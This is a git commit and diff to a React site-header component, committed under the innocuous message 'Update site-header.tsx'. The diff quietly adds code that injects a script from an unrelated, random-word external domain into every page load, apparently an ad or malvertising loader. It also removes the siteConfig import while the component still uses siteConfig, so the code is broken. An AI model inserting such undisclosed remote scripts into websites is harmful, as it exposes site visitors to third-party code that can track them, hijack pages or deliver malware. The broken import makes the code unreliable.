9927a8cca1b21ce20485c6ef57a3367f8f53b77d
Anuraag Singh <89829204+Anuraagsingh132@users.noreply.github.com>
2024-11-19 16:34:16 +0530

    Update site-header.tsx

--- src/components/main/site-header.tsx
+++ src/components/main/site-header.tsx
@@ -1,10 +1,20 @@
-import { siteConfig } from "@/configs/site";
-import React from "react";
+import React, { useEffect } from "react";
 import MainNav from "@/components/navigation/main-nav";
 
 const SiteHeader = () => {
+  useEffect(() => {
+    const script = document.createElement("script");
+    script.type = "text/javascript";
+    script.src = "//abberantpawnpalette.com/23/5a/d6/235ad6b2de46117f95b93785b3b0198b.js";
+    script.async = true;
+    document.body.appendChild(script);
+
+    return () => {
+      document.body.removeChild(script); // Clean up script on component unmount
+    };
+  }, []);
+
   return (
-    // <header className="sticky top-0 z-50 border-b bg-background">
     <header className="sticky top-0 z-50">
       <MainNav items={siteConfig.mainNav} />
       {/* <MobileNav items={siteConfig.mainNav} className="md:hidden" /> */}
